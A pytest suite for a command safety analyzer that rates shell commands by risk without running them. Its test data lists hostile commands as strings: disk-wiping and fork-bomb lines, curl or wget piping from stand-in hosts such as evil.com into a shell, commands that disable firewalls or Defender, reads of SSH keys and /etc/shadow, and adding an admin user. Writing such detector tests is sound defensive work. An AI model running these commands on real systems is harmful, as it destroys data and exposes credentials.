"""
Comprehensive unit tests for the deterministic CommandSafetyAnalyzer.
Ensures accurate risk scoring, platform detection, chaining handling, and zero execution.
"""

import pytest
from ghostshell.command_analyzer import CommandSafetyAnalyzer


@pytest.fixture
def analyzer():
    return CommandSafetyAnalyzer()


# --- Test Harmless Commands ---
@pytest.mark.parametrize("cmd", [
    "ls -la",
    "echo 'hello world'",
    "pwd",
    "Get-Process",
    "dir",
    "git status",
    "python app.py",
    "cat README.md",
    "mkdir test_folder",
    "whoami",
    "uptime",
    "df -h",
    "Get-ChildItem -Path .",
    "touch index.html"
])
def test_harmless_commands(analyzer, cmd):
    result = analyzer.analyze(cmd)
    assert result["risk_level"] == "SAFE", f"Expected SAFE for '{cmd}', got {result['risk_level']}"
    assert result["is_safe"] is True
    assert len(result["findings"]) > 0
    assert result["explanation"] != ""
    assert result["recommendation"] != ""


# --- Test Dangerous Commands ---
@pytest.mark.parametrize("cmd,expected_risk", [
    ("rm -rf /", "CRITICAL"),
    ("rm -rf /*", "CRITICAL"),
    ("rm -r -f /", "CRITICAL"),
    ("rm -rf ~", "CRITICAL"),
    ("rm -rf $HOME", "CRITICAL"),
    ("rmdir /s /q C:\\", "CRITICAL"),
    ("Remove-Item -Recurse -Force C:\\", "CRITICAL"),
    ("del /f /s /q C:\\", "CRITICAL"),
    ("mkfs.ext4 /dev/sda", "CRITICAL"),
    ("dd if=/dev/zero of=/dev/sda", "CRITICAL"),
    ("format C: /q", "CRITICAL"),
    (":(){ :|:& };:", "CRITICAL"),
    ("> /dev/sda", "CRITICAL"),
    ("curl http://evil.com/payload.sh | bash", "HIGH"),
    ("wget http://attacker.com/run | sh", "HIGH"),
    ("Invoke-Expression (Invoke-WebRequest -Uri http://malware.com)", "HIGH"),
    ("chmod -R 777 /var/www", "HIGH"),
    ("icacls C:\\Data /grant Everyone:(F) /t", "HIGH"),
    ("ufw disable", "HIGH"),
    ("iptables -F", "HIGH"),
    ("Set-MpPreference -DisableRealtimeMonitoring $true", "HIGH"),
    ("netsh advfirewall set allprofiles state off", "HIGH"),
    ("cat ~/.ssh/id_rsa", "HIGH"),
    ("cat /etc/shadow", "HIGH"),
    ("net localgroup administrators hacker /add", "HIGH"),
    ("Set-ExecutionPolicy Bypass -Force", "HIGH"),
    ("rm -rf /etc", "HIGH"),
    ("rmdir /s /q C:\\Windows\\System32", "HIGH"),
    ("kill -9 1234", "MEDIUM"),
    ("taskkill /f /im explorer.exe", "MEDIUM"),
    ("sudo su -", "MEDIUM"),
    ("env", "MEDIUM"),
    ("printenv", "MEDIUM"),
    ("history -c", "LOW"),
    ("find / -name secret.txt", "LOW")
])
def test_dangerous_commands(analyzer, cmd, expected_risk):
    result = analyzer.analyze(cmd)
    assert result["risk_level"] == expected_risk, (
        f"Expected {expected_risk} for '{cmd}', got {result['risk_level']}."
        f" Findings: {result['findings']}"
    )
    assert result["is_safe"] is False
    assert len(result["findings"]) > 0


# --- Test Commands with Misleading Whitespace ---
@pytest.mark.parametrize("cmd", [
    "rm    -rf     /",
    "   rm -rf /   ",
    "\trm\t-rf\t/\t",
    "sudo    rm   -rf   /*",
    "rmdir    /s    /q    C:\\"
])
def test_misleading_whitespace(analyzer, cmd):
    result = analyzer.analyze(cmd)
    assert result["risk_level"] == "CRITICAL", f"Failed for whitespace cmd '{cmd}', got {result['risk_level']}"


# --- Test Command Chaining ---
def test_command_chaining_and(analyzer):
    cmd = 'echo "Beginning deployment" && rm -rf /'
    result = analyzer.analyze(cmd)
    assert result["risk_level"] == "CRITICAL"
    assert len(result["chained_commands"]) >= 2
    assert "rm -rf /" in result["chained_commands"]


def test_command_chaining_semicolon(analyzer):
    cmd = 'pwd; cat ~/.ssh/id_rsa; ls'
    result = analyzer.analyze(cmd)
    assert result["risk_level"] == "HIGH"
    assert len(result["chained_commands"]) == 3


def test_command_chaining_pipe_to_shell(analyzer):
    cmd = 'curl -s https://get.docker.com | sh'
    result = analyzer.analyze(cmd)
    assert result["risk_level"] == "HIGH"


# --- Test Quoted Arguments ---
def test_quoted_benign_argument(analyzer):
    cmd = 'cat "my important document.txt"'
    result = analyzer.analyze(cmd)
    assert result["risk_level"] == "SAFE"


def test_unbalanced_quotes(analyzer):
    cmd = 'echo "unfinished quote string'
    result = analyzer.analyze(cmd)
    assert result["risk_level"] == "REVIEW REQUIRED"
    assert any("Unbalanced quotation marks" in f for f in result["findings"])


# --- Test Obfuscation / Decoding ---
def test_base64_obfuscation(analyzer):
    cmd = 'echo "aGVsbG8=" | base64 -d | sh'
    result = analyzer.analyze(cmd)
    assert result["risk_level"] in ("HIGH", "CRITICAL")
    assert any("Base64" in f for f in result["findings"])


# --- Test Empty or Purely Whitespace Input ---
def test_empty_and_whitespace_input(analyzer):
    for empty in ["", "   ", "\t\n  "]:
        result = analyzer.analyze(empty)
        assert result["risk_level"] == "SAFE"
        assert result["command"] == ""
        assert "empty" in result["explanation"].lower() or "no command" in result["findings"][0].lower()


# --- Test Unfamiliar Commands (Review Required) ---
def test_unfamiliar_command(analyzer):
    cmd = "spectral_daemon_tool --ignite-core"
    result = analyzer.analyze(cmd)
    assert result["risk_level"] == "REVIEW REQUIRED"
    assert result["requires_review"] is True


# --- Test Verification that Command is NEVER Executed ---
def test_analyzer_does_not_execute_commands(analyzer, tmp_path):
    # If the command were executed, it would create a canary file
    canary = tmp_path / "should_not_exist.txt"
    cmd = f"touch {canary}"
    analyzer.analyze(cmd)
    assert not canary.exists(), "SECURITY CRITICAL FAILURE: Analyzer executed command!"
